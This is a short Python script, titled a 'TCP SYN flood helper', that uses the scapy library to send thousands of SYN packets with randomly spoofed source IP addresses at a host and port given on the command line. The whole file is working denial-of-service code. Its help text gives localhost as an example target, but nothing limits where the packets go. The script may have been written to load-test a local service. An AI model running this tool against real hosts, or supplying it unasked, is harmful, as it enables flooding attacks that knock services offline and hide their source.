#!/usr/bin/env python3
"""
TCP SYN flood helper 

"""

from __future__ import annotations

import argparse
import random
import sys
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from scapy.all import IP, RandIP, TCP, send 


def run_syn_flood(host: str, port: int, count: int, iface: str | None) -> None:
    kwargs = {"verbose": 0}
    if iface:
        kwargs["iface"] = iface

    sent = 0
    report_every = max(500, count // 20)
    while sent < count:
        pkt = (
            IP(src=RandIP(), dst=host)
            / TCP(dport=port, flags="S", seq=random.randint(0, 2**32 - 1))
        )
        send(pkt, **kwargs)
        sent += 1
        if sent % report_every == 0 or sent == count:
            print(f"sent {sent}/{count} SYN packets (spoofed src)...", flush=True)

    print(
        f"SYN flood complete: sent {sent} SYN packets toward {host}:{port} "
        "(random source IPs via RandIP)"
    )


def main() -> None:
    p = argparse.ArgumentParser(
        description="TCP SYN packet generator"
    )
    p.add_argument("--host", required=True, help="Target host/IP (e.g. 127.0.0.1)")
    p.add_argument("--port", type=int, required=True, help="Target TCP port (e.g. 8000)")
    p.add_argument(
        "--count",
        type=int,
        default=20000,
        help="How many SYN packets to send (default: 20000)",
    )
    p.add_argument(
        "--iface",
        default=None,
        help="Optional scapy interface name (e.g. eth0). If omitted, scapy chooses.",
    )
    args = p.parse_args()

    print(
        "Starting SYN packet send.",
        flush=True,
    )
    run_syn_flood(args.host, args.port, args.count, args.iface)


if __name__ == "__main__":
    main()

